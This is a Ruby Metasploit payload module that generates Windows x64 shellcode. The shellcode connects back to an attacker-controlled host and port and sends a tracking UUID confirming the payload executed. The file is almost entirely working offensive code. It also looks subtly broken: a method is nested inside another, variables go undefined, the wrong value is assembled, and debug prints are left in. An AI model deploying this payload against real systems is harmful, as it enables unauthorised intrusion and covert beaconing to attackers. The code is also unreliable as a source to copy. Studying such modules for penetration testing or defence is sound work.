##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/pingback'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/pingback'
require 'msf/base/sessions/pingback_options'
require 'msf/core/payload/windows/x64/send_pingback'


module MetasploitModule

  CachedSize = 460

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::PingbackOptions
  include Msf::Payload::Windows::SendPingback_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Pingback, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and report UUID (Windows x64)',
      'Author'        => [ 'bwatters-r7' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::Pingback
      ))
    def generate_stage
      # 22 -> "0x00,0x16"
      # 4444 -> "0x11,0x5c"
      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
      #encoded_port = convert_input(datastore['LPORT'], 4)

      # ::1 -> "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01"
      # dead:beef:2::1009 -> "0xde,0xad,0xbe,0xef,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x09"
      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
      #encoded_host = convert_input(IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i, 32)


      puts("Generating pingback stage")
      #encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
      #encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
      pingback_uuid ||= generate_pingback_uuid
      puts("UUID in send_pingback: " + pingback_uuid.to_s.gsub("-", ""))
      uuid_as_db = "0x" + pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
      puts("UUID as db in send_pingback: " + uuid_as_db)
      puts("uuid_as_db.length: " + uuid_as_db.split(",").length.to_s)

      asm = %Q^
        reverse_tcp:
        ; setup the structures we need on the stack...
          mov r14, 'ws2_32'
          push r14                ; Push the bytes 'ws2_32',0,0 onto the stack.
          mov r14, rsp            ; save pointer to the "ws2_32" string for LoadLibraryA call.
          sub rsp, #{408+8}       ; alloc sizeof( struct WSAData ) bytes for the WSAData
                                  ; structure (+8 for alignment)
          mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.
          mov r12, #{tcp_port}
          push r12                ; host, family AF_INET and port
          mov r12, rsp            ; save pointer to sockaddr struct for connect call

        ; perform the call to LoadLibraryA...
          mov rcx, r14            ; set the param for the library to load
          mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
          call rbp                ; LoadLibraryA( "ws2_32" )

        ; perform the call to WSAStartup...
          mov rdx, r13            ; second param is a pointer to this stuct
          push 0x0101             ;
          pop rcx                 ; set the param for the version requested
          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
          call rbp                ; WSAStartup( 0x0101, &WSAData );

        ; stick the retry count on the stack and store it
          push #{retry_count}     ; retry counter
          pop r14

        create_socket:
        ; perform the call to WSASocketA...
          push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
          push rax                ; push null for reserved parameter
          xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
          xor r8, r8              ; we do not specify a protocol
          inc rax                 ;
          mov rdx, rax            ; push SOCK_STREAM
          inc rax                 ;
          mov rcx, rax            ; push AF_INET
          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
          call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
          mov rdi, rax            ; save the socket for later

        try_connect:
        ; perform the call to connect...
          push 16                 ; length of the sockaddr struct
          pop r8                  ; pop off the third param
          mov rdx, r12            ; set second param to pointer to sockaddr struct
          mov rcx, rdi            ; the socket
          mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
          call rbp                ; connect( s, &sockaddr, 16 );

          test eax, eax           ; non-zero means failure
          jz connected

        handle_connect_failure:
          dec r14                 ; decrement the retry count
          jnz try_connect

        failure:
          push 0x56A2B5F0       ; hardcoded to exitprocess for size
          call rbp

        ; this  lable is required so that reconnect attempts include
        ; the UUID stuff if required.

        connected:
        send_pingback:
          xor r9, r9              ; flags
          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
          pop r8
          call get_pingback_address  ; put uuid buffer on the stack
          db #{uuid_as_db}  ; PINGBACK_UUID
        get_pingback_address:
          pop rdx                ; PINGBACK UUID address
          mov rcx, rdi           ; Socket handle
          mov r10, #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
          call rbp               ; call send
          jmp failure
      ^
      asm
      puts("pingback_reverse_tcp asm = " +asm)
      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
  end
end
end
